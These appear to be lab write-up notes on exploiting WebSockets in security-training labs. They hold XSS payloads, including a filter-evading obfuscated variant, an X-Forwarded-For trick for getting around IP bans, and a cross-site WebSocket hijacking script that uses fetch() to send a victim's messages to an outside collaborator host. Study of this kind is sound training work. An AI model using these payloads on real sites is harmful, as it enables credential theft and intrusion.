# WebSockets

### Lab: Manipulating WebSocket messages to exploit vulnerabilities

Task: Send XSS payload to trigger an alert message

Solution:

- Simply sending `<img src=1 onerror='alert(1)'>` will not work as the client will encode it before sending it to the server

- Intercept request and send `{"message":"<img src=1 onerror='alert(1)'>"}` websocket message

### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

Task: Send XSS payload to trigger an alert message

Solution (assuming you somehow know about the need for obfuscation):

- Intercept request and send:

    ```
    {"message":"<img src=1 oNeRrOr=alert`1`>"}
    ```

Solution:

- Simply intercepting the request and sending `{"message":"<img src=1 onerror='alert(1)'>"}` websocket message will not work as server will not only block such a request but also ban our IP

- Need to obfuscate our payload

    - Reference [here](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) for OWASP cheatsheet

- Need to bypass IP ban

    - Add `X-Forwarded-For: 8.8.8.8` in request header (use valid IPs if not it wil not work either)

    - More methodologies can be found [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)

### Lab: Cross-site WebSocket hijacking

Task: Obtain Carlos credentials

Strategy:

1. Use a CSRF payload to forward all websocket messages being transmitted to and fro between carlos and target webserver

2. Use Burp collaborator Client to receive these forwarded requests

Solution:

Body:

```
<script>
    var ws = new WebSocket('wss://0ad100fa0454c2aac0bb2b1f000f0095.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://0stt7cn9z0d6nwawe4emcp7h187yvn.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
